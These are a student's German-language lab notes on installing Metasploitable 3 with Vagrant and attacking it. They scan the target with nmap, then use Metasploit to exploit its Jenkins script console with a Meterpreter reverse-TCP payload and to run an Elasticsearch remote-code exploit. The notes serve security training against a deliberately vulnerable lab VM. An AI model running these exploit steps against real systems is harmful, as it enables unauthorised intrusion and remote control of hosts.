
,## Orf Beitrag zur Schule

## Split Command
Mit split kann ein zu großes Video in einzelne Parts zerlegt werden.

---


Vagrant aus dem Internet installieren
metasploitable3 von github pullen

Anleitung: 
https://liberty-shell.com/sec/2018/07/08/install-ms3/


Vagrant Download: 
https://www.vagrantup.com/downloads.html


Metasplotable 3:
git clone https://github.com/rapid7/metasploitable3.git


vagrant up für die Installation


Attacker - 10.0.2.15

Defender - 172.28.128.3

Commands:
--
msfdb init
nmap -sV -sC vuln -oN metaspl3linux

msfconsole
db_nmap <defender-ip>
db_nmap <defender_ip> -p 8585,8484
use auxiliary/scanner/http/http_version/

=> options können gesetzt werden
options müssen auf den defender gesetzt werden, damit der exploit darauf gelaufen werden kann.
options
setg rhosts <defender-ip>
=> globales port setzen 
setg rhost <defender-ip>
setg rport 9200
=> exploit laufen lassen
run
set rport 8484
run
set rport 8585
run

==== 
Browser öffnen 
<defender-ip>:9200
<defender-ip>:8484 => JENKINS 
<defender-ip>:8585 => WAMP => PHPINFO

=== 
metasploit window öffnen
search jenkins
set targeturi /
use auxiliary/scanner/http/jenkins_enum 
setg rhosts <defender-ip>
set rport 8484
run

=> alle services auflisten
services

search jenkins
grep exploit search jenkins

use exploit/multi/http/jenkins_script_console

options
set rport 8484
set targeturi /

set payload windows/meterpreter/reverse_tcp
set lhost <attacker-ip>
set hport 5555
set rport 8484


exploit

// Windows Shell
getuid
getsystem
=> zuwenig berechtigung ziel: get root

background
search elasticsearch
use exploit/multi/elasticsearch/script_mvel_rce
set lport 9999
exploit
